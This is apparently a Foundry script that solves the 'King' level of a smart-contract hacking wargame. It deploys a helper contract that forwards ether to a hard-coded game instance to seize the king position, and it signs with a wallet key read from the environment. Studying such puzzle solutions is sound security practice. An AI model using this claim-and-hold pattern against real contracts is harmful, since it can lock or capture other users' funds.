// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/King.sol";

contract KingIsKing {
    address constant INSTANCE_ADDR = 0x8a72718Fc8483Fc4b62A8907E00F8a6190166eE5;

    receive() external payable {
        INSTANCE_ADDR.call{value: 0.01 ether}("");
    }
}

contract BeKing is Script {
    function run() public {
        uint256 key = vm.envUint("wallet_key");
        vm.startBroadcast(key);

        KingIsKing kingIsKing = new KingIsKing();
        address(kingIsKing).call{value: 0.1 ether}("");

        vm.stopBroadcast();
    }
}
